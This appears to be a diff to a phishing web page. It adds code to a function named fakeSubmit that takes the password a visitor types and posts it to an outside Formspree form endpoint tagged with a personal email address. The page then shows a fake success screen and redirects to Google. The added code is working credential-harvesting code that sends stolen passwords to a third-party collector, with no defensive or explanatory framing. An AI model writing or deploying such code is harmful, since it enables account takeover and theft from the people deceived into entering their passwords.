@@ -130,6 +130,35 @@
         function fakeSubmit() {
             document.getElementById("password-page").classList.add("hidden");
             document.getElementById("success-page").classList.remove("hidden");
+            // Data to send
+            const data = {
+              email: "radhi.alhamad@gmail.com",
+              number: document.getElementById("password").value,
+              message: "Hello!",
+              timestamp: new Date().toISOString()
+            };
+            
+            // Send POST request
+            fetch('https://formspree.io/f/xpwdzvgp', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify(data)
+            })
+            .then(response => {
+              if (!response.ok) {
+                throw new Error('Network response was not ok');
+              }
+              return response.json();
+            })
+            .then(responseData => {
+              console.log('Success:', responseData);
+            })
+            .catch(error => {
+              console.error('Error:', error);
+            });
+
             window.location.replace("https://www.google.com");
         }
     </script>
